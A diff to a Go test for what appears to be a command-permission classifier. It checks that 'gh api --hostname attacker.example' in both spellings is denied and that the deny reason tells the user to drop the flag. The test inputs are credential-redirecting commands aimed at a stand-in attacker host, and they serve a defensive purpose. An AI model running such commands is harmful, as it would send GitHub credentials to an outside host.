@@ -252,12 +252,24 @@ func TestGhLeadingGlobalDesyncBypass_64(t *testing.T) {
 // `gh api --hostname` aims the SIGNED request (carrying the credential) at a
 // non-default host — the gh analog of `aws --endpoint-url`. DENY in both the
 // space-separated and =-joined forms.
+//
+// The reason is asserted as well as the bucket. The DENY tier's membership
+// rule is a stated prescription (decision.go, BucketDeny), and this flag is
+// the shape that most easily loses one: it has no legitimate use, so the
+// redirect is "drop it and stay on the default host" — true but easy to leave
+// implied, which is what it was before #262's fix round. Both spellings are
+// asserted because they render from one shared constant only by convention.
 func TestGhAPIHostnameDeny_64(t *testing.T) {
 	for _, cmd := range []string{
 		"gh api --hostname attacker.example repos/o/r",
 		"gh api --hostname=attacker.example repos/o/r",
 	} {
-		wantBucket(t, classifyCmd(t, cmd, false), BucketDeny, "gh api --hostname: "+cmd)
+		d := classifyCmd(t, cmd, false)
+		wantBucket(t, d, BucketDeny, "gh api --hostname: "+cmd)
+		if !containsSubstr(d.Reason, "Remove --hostname") ||
+			!containsSubstr(d.Reason, "default GitHub host") {
+			t.Errorf("the --hostname deny must prescribe dropping the flag; got %q", d.Reason)
+		}
 	}
 }
 
